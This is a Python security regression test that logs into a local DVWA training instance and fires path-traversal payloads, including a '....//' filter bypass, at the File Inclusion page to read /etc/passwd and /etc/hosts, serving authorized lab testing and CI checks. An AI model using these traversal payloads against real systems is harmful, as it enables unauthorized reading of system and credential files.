#!/usr/bin/env python3
"""
DVWA Local File Inclusion (LFI) — Security Regression Test
=============================================================

Purpose
-------
Verifies that the DVWA "File Inclusion" vulnerability page (security=low)
is reachable and that the `page=` parameter allows reading arbitrary local
files (classic LFI), using /etc/passwd as the canary file.

This is intended to run against a LOCAL, AUTHORIZED, INTENTIONALLY
VULNERABLE training instance of DVWA (e.g. http://127.0.0.1:8080).
Do not point this at any host you do not own or have explicit written
authorization to test.

CI/CD usage
-----------
Exit codes:
    0 -> LFI NOT confirmed (page did not leak file contents) -- "pass" for
         a hardened build, "fail" for an intentionally-vulnerable one.
    1 -> LFI CONFIRMED (file contents leaked) -- treat as a regression
         if this appears on a build that is supposed to be patched.
    2 -> Script/environment error (couldn't log in, target unreachable, etc.)

Wire this into your pipeline as a "fails closed" gate however fits your
workflow -- e.g. invert the exit code in CI config if 0 should mean
"vulnerability still present and expected" for a deliberately-vulnerable
training image.
"""

import re
import sys
import argparse
from urllib.parse import urljoin

import requests


DEFAULT_BASE_URL = "http://127.0.0.1:8080"
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "password"  # DVWA's documented default creds
CANARY_PATTERNS = {
    "/etc/passwd": re.compile(r"root:.*:0:0:"),
    "/etc/hosts": re.compile(r"127\.0\.0\.1\s+localhost"),
}


def log(msg: str) -> None:
    print(f"[*] {msg}")


def get_csrf_token(html: str) -> str | None:
    """DVWA's login form embeds a CSRF token as a hidden input named 'user_token'."""
    match = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([a-f0-9]+)['\"]", html)
    return match.group(1) if match else None


def login(session: requests.Session, base_url: str, username: str, password: str) -> bool:
    login_url = urljoin(base_url, "/login.php")

    log(f"Fetching login page: {login_url}")
    resp = session.get(login_url, timeout=10)
    resp.raise_for_status()

    token = get_csrf_token(resp.text)
    if not token:
        log("Could not locate CSRF token on login page.")
        return False

    log("Submitting credentials...")
    payload = {
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": token,
    }
    resp = session.post(login_url, data=payload, timeout=10, allow_redirects=True)
    resp.raise_for_status()

    # A successful login redirects away from login.php entirely. Checking only
    # for "Login failed" text was a false-positive trap: an uninitialized
    # database (or any other silent failure) can redirect back to login.php
    # without that exact string present, and this used to be misread as success.
    if "login.php" in resp.url:
        log("Login failed -- still on login.php after submit "
            "(check credentials, or that the database has been initialized via setup.php).")
        return False

    log("Login succeeded.")
    return True


def set_security_level(session: requests.Session, base_url: str, level: str = "low") -> bool:
    security_url = urljoin(base_url, "/security.php")

    resp = session.get(security_url, timeout=10)
    resp.raise_for_status()
    log(f"security.php GET: status={resp.status_code}, final_url={resp.url}")

    token = get_csrf_token(resp.text)
    log(f"CSRF token found: {token!r}")
    if not token:
        snippet = re.sub(r"\s+", " ", resp.text[:400]).strip()
        log(f"security.php GET body snippet (no token found): {snippet!r}")

    data = {"security": level, "seclev_submit": "Submit"}
    if token:
        data["user_token"] = token

    resp = session.post(security_url, data=data, timeout=10)
    resp.raise_for_status()
    log(f"security.php POST: status={resp.status_code}, final_url={resp.url}")

    # Confirm the security cookie actually got set to the requested level.
    cookie_level = session.cookies.get("security")
    if cookie_level != level:
        log(f"Security cookie is '{cookie_level}', expected '{level}'.")
        snippet = re.sub(r"\s+", " ", resp.text[:400]).strip()
        log(f"security.php POST response snippet: {snippet!r}")
        return False

    log(f"Security level set to '{level}'.")
    return True


FI_PATH_CANDIDATES = [
    "/vulnerabilities/fi/",
    "/vulnerabilities/fi/index.php",
    "/dvwa/vulnerabilities/fi/",
    "/dvwa/vulnerabilities/fi/index.php",
]

FI_PAGE_MARKER = re.compile(r"Vulnerability:\s*File Inclusion", re.IGNORECASE)


def discover_fi_url(session: requests.Session, base_url: str) -> str:
    """
    Try the common DVWA path layouts and return the first one that actually
    renders the File Inclusion page (checked by content marker, not just
    HTTP status -- a 200 with a directory-listing-denied or redirect page
    is not a hit).
    """
    for path in FI_PATH_CANDIDATES:
        url = urljoin(base_url, path)
        try:
            resp = session.get(url, params={"page": "include.php"}, timeout=10)
        except requests.exceptions.RequestException:
            continue

        log(f"Probing {url} -> status={resp.status_code}, final_url={resp.url}")

        if resp.status_code == 200 and FI_PAGE_MARKER.search(resp.text):
            log(f"Confirmed working File Inclusion endpoint: {url}")
            return url

    raise RuntimeError(
        "Could not locate the File Inclusion page automatically. "
        "Log in via browser, click 'File Inclusion' in the left nav, "
        "and pass its exact path via --fi-path."
    )


def get_baseline_length(session: requests.Session, fi_url: str) -> int:
    """
    Request the fi page with a deliberately nonexistent 'page' value, so we
    have a known-safe Content-Length to diff against. A real leak should
    produce a response meaningfully larger (and pattern-matching) relative
    to this baseline, not just a 200 status -- DVWA returns 200 either way.
    """
    resp = session.get(fi_url, params={"page": "__no_such_file__"}, timeout=10)
    resp.raise_for_status()

    log(f"Baseline request: status={resp.status_code}, final_url={resp.url}")
    snippet = re.sub(r"\s+", " ", resp.text[:300]).strip()
    log(f"Baseline response snippet: {snippet!r}")

    return len(resp.content)


def run_lfi_poc(session: requests.Session, base_url: str, fi_path_override: str | None = None) -> tuple[bool, str, dict]:
    """
    Sends traversal payloads against the File Inclusion endpoint for each
    canary file, attempting to read local filesystem contents via the
    unsanitized `page` parameter.

    DVWA's fi page (note the /dvwa/ application root prefix on this install)
    is reached at:
        GET /dvwa/vulnerabilities/fi/?page=<target>
    """
    fi_url = urljoin(base_url, fi_path_override) if fi_path_override else discover_fi_url(session, base_url)
    baseline_length = get_baseline_length(session, fi_url)
    log(f"Baseline (non-existent file) response length: {baseline_length} bytes")

    traversal_prefixes = [
        "",
        "../../../../../../",
        "....//....//....//....//....//....//",  # naive filter bypass
    ]

    report = {"baseline_length": baseline_length, "attempts": []}

    for target_file, canary in CANARY_PATTERNS.items():
        for prefix in traversal_prefixes:
            payload = f"{prefix}{target_file.lstrip('/')}" if prefix else target_file
            resp = session.get(fi_url, params={"page": payload}, timeout=10)
            resp.raise_for_status()
            length = len(resp.content)
            delta = length - baseline_length
            matched = bool(canary.search(resp.text))

            log(f"page={payload!r} -> {length} bytes (Δ{delta:+d} vs baseline), pattern_match={matched}")
            report["attempts"].append({
                "target_file": target_file,
                "payload": payload,
                "content_length": length,
                "delta_vs_baseline": delta,
                "pattern_matched": matched,
            })

            if matched and delta > 0:
                return True, resp.text, report

    return False, resp.text, report


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL, help="DVWA base URL (default: %(default)s)")
    parser.add_argument("--username", default=DEFAULT_USERNAME, help="DVWA login username")
    parser.add_argument("--password", default=DEFAULT_PASSWORD, help="DVWA login password")
    parser.add_argument("--verbose", action="store_true", help="Print full response body on confirmation")
    parser.add_argument("--fi-path", default=None,
                         help="Exact path to the File Inclusion page, e.g. /dvwa/vulnerabilities/fi/index.php "
                              "(skips auto-discovery if provided)")
    parser.add_argument("--security-level", default="low", choices=["low", "medium", "high", "impossible"],
                         help="DVWA security level to set before testing (default: %(default)s)")
    args = parser.parse_args()

    session = requests.Session()

    try:
        if not login(session, args.base_url, args.username, args.password):
            log("Aborting: authentication failed.")
            return 2

        if not set_security_level(session, args.base_url, args.security_level):
            log("Aborting: could not set security level.")
            return 2

        confirmed, body, report = run_lfi_poc(session, args.base_url, args.fi_path)

    except requests.exceptions.RequestException as exc:
        log(f"Request error: {exc}")
        return 2
    except RuntimeError as exc:
        log(str(exc))
        return 2

    print("\n" + "=" * 70)
    print(f"Baseline response length: {report['baseline_length']} bytes")
    for attempt in report["attempts"]:
        flag = "LEAK" if attempt["pattern_matched"] and attempt["delta_vs_baseline"] > 0 else "    "
        print(f"[{flag}] page={attempt['payload']!r:55} "
              f"len={attempt['content_length']:>6} (Δ{attempt['delta_vs_baseline']:+d})")
    print("=" * 70)

    if confirmed:
        print("[CONFIRMED] Local File Inclusion leaked system file contents.")
        print("=" * 70)
        # Print only lines that look like real leaked content, not the whole HTML page
        for line in body.splitlines():
            stripped = line.strip()
            if any(p.search(stripped) for p in CANARY_PATTERNS.values()):
                print(stripped)
        print("=" * 70 + "\n")
        return 1
    else:
        print("[NOT CONFIRMED] Payloads did not produce a content-length increase with a matching canary pattern.")
        print("=" * 70 + "\n")
        return 0


if __name__ == "__main__":
    sys.exit(main())
